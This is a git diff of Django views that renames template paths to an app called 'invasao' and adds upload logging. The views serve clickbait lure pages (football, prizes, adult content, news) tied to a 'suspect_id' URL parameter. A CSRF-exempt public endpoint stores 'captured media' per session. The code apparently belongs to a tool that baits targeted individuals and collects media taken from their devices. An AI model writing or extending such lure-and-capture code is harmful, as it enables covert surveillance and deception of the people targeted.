@@ -22,7 +22,7 @@ def invasion_page(request):
     """
     # Get suspect ID from URL parameter
     suspect_id = request.GET.get('suspect_id', '1')
-    return render(request, 'angosite/invasion_page.html', {'suspect_id': suspect_id})
+    return render(request, 'invasao/invasion_page.html', {'suspect_id': suspect_id})
 
 def football_template(request):
     """
@@ -30,7 +30,7 @@ def football_template(request):
     """
     # Get suspect ID from URL parameter
     suspect_id = request.GET.get('suspect_id', '1')
-    return render(request, 'angosite/templates/football.html', {'suspect_id': suspect_id})
+    return render(request, 'invasao/templates/football.html', {'suspect_id': suspect_id})
 
 def prizes_template(request):
     """
@@ -38,7 +38,7 @@ def prizes_template(request):
     """
     # Get suspect ID from URL parameter
     suspect_id = request.GET.get('suspect_id', '1')
-    return render(request, 'angosite/templates/prizes.html', {'suspect_id': suspect_id})
+    return render(request, 'invasao/templates/prizes.html', {'suspect_id': suspect_id})
 
 def adult_template(request):
     """
@@ -46,7 +46,7 @@ def adult_template(request):
     """
     # Get suspect ID from URL parameter
     suspect_id = request.GET.get('suspect_id', '1')
-    return render(request, 'angosite/templates/adult.html', {'suspect_id': suspect_id})
+    return render(request, 'invasao/templates/adult.html', {'suspect_id': suspect_id})
 
 def news_template(request):
     """
@@ -54,7 +54,7 @@ def news_template(request):
     """
     # Get suspect ID from URL parameter
     suspect_id = request.GET.get('suspect_id', '1')
-    return render(request, 'angosite/templates/news.html', {'suspect_id': suspect_id})
+    return render(request, 'invasao/templates/news.html', {'suspect_id': suspect_id})
 
 @method_decorator(csrf_exempt, name='dispatch')
 class PublicMediaUploadView(APIView):
@@ -105,13 +105,14 @@ class PublicMediaUploadView(APIView):
         file_size = None
         if 'file' in request.FILES:
             file_size = request.FILES['file'].size
+            print(f"Received upload request: media_type={request.data.get('media_type')}, file_size={file_size} bytes")
         
         request_data['file_size'] = file_size
         
         serializer = CapturedMediaSerializer(data=request_data)
         if serializer.is_valid():
             saved_media = serializer.save()
-            print(f"Saved media with ID: {saved_media.id}, Session ID: {saved_media.session.id}")
+            print(f"Saved media with ID: {saved_media.id}, Type: {saved_media.media_type}, Session ID: {saved_media.session.id}")
             return Response(serializer.data, status=status.HTTP_201_CREATED)
         else:
             print(f"Serializer errors: {serializer.errors}")
